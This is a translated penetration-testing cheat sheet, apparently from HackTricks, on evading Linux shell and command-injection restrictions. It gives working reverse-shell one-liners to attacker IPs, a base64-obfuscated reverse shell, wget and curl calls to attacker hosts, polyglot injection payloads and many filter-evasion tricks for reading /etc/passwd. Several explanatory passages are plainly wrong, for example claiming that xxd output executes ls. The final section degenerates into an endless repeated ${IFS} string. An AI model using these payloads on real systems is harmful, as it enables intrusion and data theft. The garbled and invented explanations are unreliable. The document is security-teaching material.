# 绕过Linux限制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和**自动化工作流程**，使用世界上**最先进的**社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 常见限制绕过

### 反向Shell
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### 简短的反向Shell

A reverse shell is a technique used by hackers to gain remote access to a target system. It involves establishing a connection from the target system to the attacker's machine, allowing the attacker to execute commands on the target system.

To create a short reverse shell, you can use the following command:

```bash
bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
```

Replace `attacker-ip` with the IP address of your machine and `attacker-port` with the port number you want to use for the connection.

This command uses the `/dev/tcp` feature in Bash to establish a TCP connection to the attacker's machine. The `>&` operator redirects both the standard output and standard error streams to the specified address. The `0>&1` part redirects the standard input stream to the same address, ensuring that the shell can receive commands from the attacker.

Once the connection is established, you will have a shell prompt on the target system, allowing you to execute commands remotely.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### 绕过路径和禁用词

When conducting a penetration test or trying to gain unauthorized access to a system, it is common to encounter restrictions on certain paths and forbidden words. These restrictions are put in place to prevent unauthorized access and protect the system from potential vulnerabilities.

However, as a hacker, it is important to know how to bypass these restrictions and find alternative paths to achieve your goals. Here are some useful Linux commands that can help you bypass paths and forbidden words:

1. **mv** command: The `mv` command can be used to rename files and directories. By renaming a restricted file or directory to a non-restricted name, you can bypass the restriction and gain access.

2. **ln** command: The `ln` command can be used to create symbolic links. By creating a symbolic link to a restricted file or directory with a non-restricted name, you can bypass the restriction and access the file or directory.

3. **find** command: The `find` command can be used to search for files and directories. By using the `-iname` option, you can search for files and directories without being case-sensitive. This can help you bypass restrictions on forbidden words.

4. **grep** command: The `grep` command can be used to search for specific patterns in files. By using the `-v` option, you can invert the match and search for files that do not contain the forbidden word. This can help you bypass restrictions on forbidden words.

5. **chmod** command: The `chmod` command can be used to change the permissions of files and directories. By changing the permissions of a restricted file or directory, you may be able to gain access to it.

It is important to note that bypassing restrictions and gaining unauthorized access to a system is illegal and unethical. These commands should only be used for educational purposes or with proper authorization. Always ensure that you have the necessary permissions and legal rights before attempting any hacking techniques.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### 绕过禁止空格

In some cases, when attempting to execute commands that contain spaces, you may encounter restrictions that prevent the execution. However, there are several techniques you can use to bypass these restrictions and successfully execute the desired commands.

#### Technique 1: Enclosing the command in quotes

One simple technique is to enclose the entire command, including the spaces, in quotes. This tells the shell to treat the entire command as a single argument, effectively bypassing any restrictions on spaces.

For example, instead of running the command `ls -l /etc/passwd`, which contains a space between `ls` and `-l`, you can run `"ls -l /etc/passwd"`.

#### Technique 2: Using escape characters

Another technique is to use escape characters to indicate that the space should be treated as part of the command, rather than a delimiter. The most commonly used escape character is the backslash `\`.

For example, instead of running the command `ls -l /etc/passwd`, you can run `ls\ -l\ /etc/passwd`.

#### Technique 3: Using alternative shells

If the restrictions on spaces are specific to the default shell, you can try using an alternative shell that does not have these restrictions. For example, you can use the `bash` shell instead of the default `sh` shell.

To do this, you can run the command `/bin/bash -c "ls -l /etc/passwd"`. This tells the system to execute the command using the `bash` shell, which does not have the same restrictions on spaces.

By using these techniques, you can bypass restrictions on spaces and successfully execute commands that contain spaces. However, it is important to note that bypassing restrictions may be considered unauthorized access and may be illegal. Always ensure that you have proper authorization before attempting to bypass any restrictions.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### 绕过反斜杠和斜杠限制

在某些情况下，系统管理员可能会限制用户在命令行中使用反斜杠（\）和斜杠（/）字符。这些字符在执行命令时非常有用，因为它们可以用于转义特殊字符或路径。

然而，即使受到限制，仍然有一些方法可以绕过这些限制。下面是一些绕过反斜杠和斜杠限制的方法：

#### 使用ASCII码

可以使用ASCII码来绕过反斜杠和斜杠限制。每个字符都有一个对应的ASCII码值，可以使用这些值来代替反斜杠和斜杠字符。例如，反斜杠的ASCII码值是92，斜杠的ASCII码值是47。

以下是使用ASCII码绕过限制的示例：

```bash
$ echo -e "\x5c" # 使用ASCII码绕过反斜杠限制
$ echo -e "\x2f" # 使用ASCII码绕过斜杠限制
```

#### 使用Unicode编码

类似于ASCII码，Unicode编码也可以用于绕过反斜杠和斜杠限制。Unicode编码是一种用于表示字符的标准，它为每个字符分配了一个唯一的数字值。

以下是使用Unicode编码绕过限制的示例：

```bash
$ echo -e "\u005c" # 使用Unicode编码绕过反斜杠限制
$ echo -e "\u002f" # 使用Unicode编码绕过斜杠限制
```

#### 使用其他字符

除了反斜杠和斜杠之外，还可以使用其他字符来绕过限制。例如，可以使用其他特殊字符或符号来代替反斜杠和斜杠。

以下是使用其他字符绕过限制的示例：

```bash
$ echo -e "＼" # 使用全角反斜杠绕过反斜杠限制
$ echo -e "／" # 使用全角斜杠绕过斜杠限制
```

请注意，绕过限制可能违反系统规则或安全策略。在进行任何绕过操作之前，请确保您有合法的授权和充分的理由。
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### 绕过管道限制

在某些情况下，您可能会遇到受限制的Bash环境，其中禁用了某些命令或功能。然而，您可以使用管道操作符（`|`）来绕过这些限制，并执行被禁用的命令。

以下是一些绕过管道限制的方法：

1. 使用`less`命令：如果`more`命令被禁用，您可以使用`less`命令来分页显示输出。例如，`command | less`。

2. 使用`grep`命令：如果您无法使用`more`或`less`命令，您可以使用`grep`命令来过滤输出并逐行显示。例如，`command | grep .`。

3. 使用`awk`命令：如果您无法使用`more`、`less`或`grep`命令，您可以使用`awk`命令来处理输出。例如，`command | awk '{print}'`。

请注意，这些方法只是绕过管道限制的一种方式，并不适用于所有情况。在某些情况下，您可能需要使用其他技术或工具来绕过更严格的限制。
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### 通过十六进制编码绕过限制

Sometimes, when trying to execute certain commands or access restricted files, you may encounter restrictions imposed by the system. One way to bypass these restrictions is by using hex encoding.

有时候，在尝试执行特定命令或访问受限文件时，你可能会遇到系统强加的限制。绕过这些限制的一种方法是使用十六进制编码。

Hex encoding involves converting the characters of a command or file path into their hexadecimal representation. This can be done using the `xxd` command in Linux.

十六进制编码涉及将命令或文件路径的字符转换为十六进制表示。在Linux中，可以使用`xxd`命令来完成这个过程。

To bypass restrictions using hex encoding, follow these steps:

要通过十六进制编码绕过限制，请按照以下步骤进行操作：

1. Identify the command or file path that is restricted.

   确定受限制的命令或文件路径。

2. Convert the characters of the command or file path into their hexadecimal representation using the `xxd` command. For example, to convert the command `ls` into hexadecimal, you would run:

   使用`xxd`命令将命令或文件路径的字符转换为十六进制表示。例如，要将命令`ls`转换为十六进制，可以运行以下命令：

   ```bash
   echo -n "ls" | xxd -p
   ```

   This will output the hexadecimal representation of the command, which you can use to bypass restrictions.

   这将输出命令的十六进制表示，你可以使用它来绕过限制。

3. Use the hexadecimal representation of the command or file path to execute the desired action. For example, to execute the `ls` command using the hexadecimal representation, you would run:

   使用命令或文件路径的十六进制表示来执行所需的操作。例如，要使用十六进制表示执行`ls`命令，可以运行以下命令：

   ```bash
   echo -e "\x6c\x73" | xxd -r -p
   ```

   This will execute the `ls` command, bypassing any restrictions that were in place.

   这将执行`ls`命令，绕过任何限制。

By using hex encoding, you can bypass certain restrictions and gain access to restricted commands or files. However, it's important to note that bypassing restrictions may be against the system's policies or illegal, so use this technique responsibly and ethically.

通过使用十六进制编码，你可以绕过某些限制并访问受限制的命令或文件。然而，需要注意的是，绕过限制可能违反系统的政策或是非法的，因此请负责任和合乎道德地使用这种技术。
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### 绕过IP限制

Sometimes, during a penetration test, you may encounter situations where certain IP addresses are restricted or blocked. In such cases, you can try bypassing these restrictions using various techniques. Here are a few methods you can use:

1. **Proxy Servers**: Utilize proxy servers to route your traffic through a different IP address. This can help you bypass IP restrictions by making it appear as if your requests are coming from a different location.

2. **VPN (Virtual Private Network)**: Connect to a VPN service that allows you to choose a different IP address. By routing your traffic through the VPN server, you can bypass IP restrictions and access restricted resources.

3. **TOR (The Onion Router)**: TOR is a network of volunteer-operated servers that allows you to browse the internet anonymously. By using TOR, your traffic is routed through multiple nodes, making it difficult to trace back to your original IP address.

4. **SSH Tunnels**: Set up an SSH tunnel to redirect your traffic through a remote server. This can help you bypass IP restrictions by making it appear as if your requests are originating from the remote server's IP address.

5. **Proxychains**: Proxychains is a tool that allows you to run any program through a proxy server. By configuring Proxychains to use a proxy server with a different IP address, you can bypass IP restrictions for specific applications.

Remember, while bypassing IP restrictions can be useful during a penetration test, it is important to always obtain proper authorization and adhere to ethical guidelines.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### 基于时间的数据泄露

Time based data exfiltration is a technique used by hackers to bypass restrictions and exfiltrate data from a compromised system. This technique involves using delays or timing mechanisms to transmit data in a covert manner, making it difficult to detect.

In a typical scenario, the hacker may use a command injection vulnerability to execute arbitrary commands on the compromised system. Instead of directly transmitting the exfiltrated data, the hacker can use time delays to encode the data and transmit it in a way that appears innocuous.

For example, the hacker may use the `ping` command to send ICMP echo requests to a remote server. By manipulating the payload of the ICMP packets, the hacker can encode the exfiltrated data. The delay between the ICMP requests can be used to transmit binary data, with a longer delay representing a binary 1 and a shorter delay representing a binary 0.

To detect and prevent time based data exfiltration, it is important to implement proper input validation and sanitization to prevent command injection vulnerabilities. Additionally, network monitoring and anomaly detection can help identify unusual patterns of ICMP traffic that may indicate data exfiltration.

By understanding and being aware of time based data exfiltration techniques, system administrators and security professionals can better protect their systems from such attacks.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### 从环境变量中获取字符

In some cases, you may encounter restrictions that prevent you from executing certain commands or accessing certain files. However, you may still be able to bypass these restrictions by leveraging the environment variables available to you.

在某些情况下，您可能会遇到阻止您执行某些命令或访问某些文件的限制。然而，您仍然可以通过利用可用的环境变量来绕过这些限制。

One useful technique is to extract characters from environment variables and use them to construct the desired command or access restricted files. Here's how you can do it:

一种有用的技术是从环境变量中提取字符，并使用它们来构建所需的命令或访问受限文件。以下是您可以执行的操作：

1. Identify an environment variable that contains the desired characters. You can use the `env` command to list all environment variables.

   1. 确定包含所需字符的环境变量。您可以使用 `env` 命令列出所有环境变量。

2. Extract the desired characters from the environment variable using the `echo` command and command substitution. For example, if the environment variable is `$MY_VAR` and you want to extract the first character, you can use the following command:

   2. 使用 `echo` 命令和命令替换从环境变量中提取所需字符。例如，如果环境变量是 `$MY_VAR`，并且您想提取第一个字符，可以使用以下命令：

   ```bash
   echo "${MY_VAR:0:1}"
   ```

   This command will output the first character of the environment variable.

   此命令将输出环境变量的第一个字符。

3. Use the extracted characters to construct the desired command or access restricted files. You can concatenate the characters using the `.` operator or use them as arguments to other commands.

   3. 使用提取的字符来构建所需的命令或访问受限文件。您可以使用 `.` 运算符连接字符，或将它们用作其他命令的参数。

By extracting characters from environment variables, you can bypass certain restrictions and achieve your desired objectives even in restricted environments.

通过从环境变量中提取字符，您可以绕过某些限制，在受限环境中实现您的目标。
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS数据泄露

你可以使用**burpcollab**或[**pingb**](http://pingb.in)等工具。

### 内置命令

如果你无法执行外部函数，只能访问**有限的内置命令来获取RCE**，那么有一些巧妙的技巧可以帮助你。通常你**无法使用所有的**内置命令，所以你应该**了解所有的选择**来尝试绕过限制。灵感来自[**devploit**](https://twitter.com/devploit)。\
首先，检查所有的[**shell内置命令**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**。**然后，这里有一些建议：
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### 多语言命令注入

Polyglot command injection (多语言命令注入) 是一种利用不同语言解释器的漏洞来执行恶意命令的技术。这种攻击方法可以绕过基于特定语言的命令过滤和限制，从而使攻击者能够在目标系统上执行任意命令。

在多语言命令注入攻击中，攻击者利用目标系统上安装的多个解释器（如Bash、Python、Perl等）之间的差异来构造恶意命令。通过使用特定的语法和技巧，攻击者可以在不同的解释器中执行相同的命令，从而绕过特定解释器的限制。

为了成功执行多语言命令注入攻击，攻击者需要了解目标系统上安装的不同解释器的语法和特性。他们还需要找到可以在多个解释器中执行的命令，以便在攻击过程中选择合适的解释器。

为了防止多语言命令注入攻击，建议采取以下措施：

- 定期更新和维护系统上安装的解释器，以确保已修复已知的漏洞。
- 限制解释器的访问权限，只允许授权用户或进程执行命令。
- 验证和过滤用户输入，特别是在执行命令时。
- 使用安全编码实践，如避免使用用户提供的输入构造命令。
- 监控系统日志，以便及时检测和响应任何异常命令执行行为。

通过采取这些措施，可以减少多语言命令注入攻击的风险，并提高系统的安全性。
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### 绕过潜在的正则表达式限制

在进行渗透测试时，有时会遇到正则表达式的限制，这可能会阻碍我们的进一步操作。然而，我们可以使用一些技巧来绕过这些限制。

#### 1. 使用字符类

正则表达式中的字符类可以帮助我们绕过某些限制。例如，如果我们想匹配一个数字，但是正则表达式限制了我们只能使用特定的数字范围，我们可以使用字符类来绕过这个限制。例如，`[0-9]`可以匹配任何数字。

#### 2. 使用转义字符

转义字符可以帮助我们绕过正则表达式的限制。例如，如果正则表达式限制了我们不能使用特定的字符，我们可以使用转义字符`\`来绕过这个限制。例如，`\.`可以匹配一个点号。

#### 3. 使用反向引用

反向引用可以帮助我们绕过正则表达式的限制。如果我们想匹配一个特定的字符串，但是正则表达式限制了我们只能使用特定的字符，我们可以使用反向引用来绕过这个限制。例如，如果我们想匹配一个由数字和字母组成的字符串，但是正则表达式限制了我们只能使用数字，我们可以使用反向引用来绕过这个限制。

#### 4. 使用非贪婪模式

非贪婪模式可以帮助我们绕过正则表达式的限制。正则表达式通常是贪婪的，意味着它们会尽可能多地匹配字符。然而，如果我们想匹配一个特定的字符串，但是正则表达式限制了我们只能使用特定的字符，我们可以使用非贪婪模式来绕过这个限制。

#### 5. 使用零宽断言

零宽断言可以帮助我们绕过正则表达式的限制。零宽断言是一种特殊的正则表达式语法，用于在匹配字符串时指定位置而不是字符。通过使用零宽断言，我们可以绕过某些限制并更精确地匹配字符串。

以上是一些绕过潜在正则表达式限制的技巧。在渗透测试过程中，我们应该灵活运用这些技巧，以便更好地完成任务。
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bash混淆器

Bashfuscator是一个用于混淆Bash脚本的工具。它可以修改脚本的结构和语法，使其难以理解和分析。通过使用Bashfuscator，攻击者可以绕过Bash脚本的限制，隐藏恶意代码的真实意图。

#### 使用Bashfuscator的步骤

1. **安装Bashfuscator**：首先，需要从Bashfuscator的官方网站下载并安装该工具。

2. **选择要混淆的脚本**：选择要混淆的Bash脚本文件。

3. **运行Bashfuscator**：使用以下命令运行Bashfuscator，并指定要混淆的脚本文件：

   ```
   bashfuscator -i <input_script> -o <output_script>
   ```

   其中，`<input_script>`是要混淆的脚本文件的路径，`<output_script>`是混淆后的脚本文件的路径。

4. **查看混淆结果**：Bashfuscator将生成一个混淆后的脚本文件。您可以查看该文件，以确保混淆成功。

5. **测试混淆后的脚本**：在安全环境中运行混淆后的脚本，以确保其功能正常。

#### 注意事项

- 在使用Bashfuscator混淆脚本之前，请确保您已经获得了合法的授权，并且遵守了适用的法律法规。

- 混淆脚本可能会导致代码的可读性降低，因此在使用Bashfuscator之前，请确保您已经备份了原始脚本文件。

- Bashfuscator只是一种混淆技术，不能完全保证脚本的安全性。在编写和使用Bash脚本时，请始终遵循最佳安全实践。

- Bashfuscator的使用应仅限于合法的安全测试和研究目的。任何非法使用造成的后果将由使用者自行承担。

#### 结论

Bashfuscator是一个强大的工具，可以帮助攻击者绕过Bash脚本的限制，并隐藏恶意代码。然而，使用Bashfuscator需要谨慎，并遵守适用的法律法规。
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 五个字符实现远程命令执行（RCE）

在某些情况下，我们可能会遇到受限制的环境，其中我们无法使用常规的命令执行技术。然而，我们仍然可以利用一些特殊的字符来绕过这些限制，并实现远程命令执行（RCE）。

以下是一个使用仅限于五个字符的技巧，用于在受限制的环境中实现RCE：

```bash
${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${